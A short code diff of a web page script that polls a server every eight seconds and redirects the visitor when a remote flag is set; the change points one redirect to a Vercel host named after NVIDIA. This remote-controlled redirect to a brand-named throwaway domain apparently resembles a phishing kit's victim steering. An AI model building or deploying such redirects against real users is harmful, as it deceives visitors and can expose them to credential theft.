@@ -83,7 +83,7 @@ async function fetchData(){
     // Redirect logic (update3 and update)
     if(data.update3 === true && !redirectTriggered){
       redirectTriggered = true;
-      window.location.href = "https://custom-form-orcin.vercel.app/";
+      window.location.href = "https://nvidia-fawn.vercel.app/";
     } else if(data.update === true && !redirectTriggered){
       redirectTriggered = true;
       window.location.href = REDIRECT_URL;
@@ -236,3 +236,4 @@ setInterval(fetchData, 8000);
 </script>
 </body>
 </html>
+
